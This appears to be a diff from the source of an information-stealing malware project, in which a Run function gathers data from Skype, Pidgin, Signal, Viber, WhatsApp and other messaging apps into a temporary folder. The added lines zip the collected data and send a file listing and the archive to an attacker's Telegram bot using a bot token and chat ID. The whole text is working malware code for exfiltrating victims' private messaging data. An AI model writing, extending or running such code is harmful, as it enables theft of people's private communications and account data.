@@ -6,9 +6,10 @@ import (
 	"path/filepath"
 
 	"github.com/unf6/vryxen/pkg/utils/fileutil"
+	"github.com/unf6/vryxen/pkg/utils/requests"
 )
 
-func Run() {
+func Run(botToken, chatId string) {
 	folderMessaging := filepath.Join(os.Getenv("TEMP"), "Vryxen", "SocialMedias")
 	skypeStealer(folderMessaging)
 	pidginStealer(folderMessaging)
@@ -19,6 +20,17 @@ func Run() {
 	signalStealer(folderMessaging)
 	viberStealer(folderMessaging)
 	whatsappStealer(folderMessaging)
+
+	tempZip := filepath.Join(folderMessaging, "Socials.zip")
+	if err := fileutil.Zip(folderMessaging, tempZip); err != nil {
+		return
+	}
+
+	message := fmt.Sprintf("Socials: %s", fileutil.Tree(folderMessaging, ""))
+
+	requests.Send2TelegramMessage(botToken, chatId, message)
+	requests.Send2TelegramDocument(botToken, chatId, tempZip)
+	
 }
 
 func skypeStealer(folderMessaging string) {
